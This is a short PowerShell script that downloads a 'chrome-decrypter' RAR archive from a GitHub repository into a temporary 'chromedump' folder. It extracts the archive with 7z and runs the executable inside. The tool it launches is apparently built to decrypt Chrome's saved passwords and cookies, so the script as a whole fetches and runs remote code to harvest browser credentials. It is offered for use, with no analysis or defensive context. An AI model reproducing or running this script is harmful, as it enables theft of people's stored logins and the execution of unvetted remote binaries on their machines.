$Link = "https://github.com/sabinfotograf/chrome_decrypt2024/raw/main/chrome-decrypter-master.rar"
$File = Join-Path -Path "$Env:TMP\chromedump" -ChildPath "chrome-decrypter-master.rar"
$Folder = Split-path $file -Parent; if(test-path $folder){rmdir $Folder -Recurse -Force | Out-Null}
mkdir $Folder
CLS

Set-Location $folder
Write-host "`t- Downloading"
Invoke-RestMethod -Uri $Link -OutFile $File 

Write-host "`t- Extracting"
7z e $File -spf | Out-Null

Start-Sleep -S 5
Write-host "`t- Running.."
&.\chrome_decrypt2024.exe

write-host "Credits to: SabinFotograf"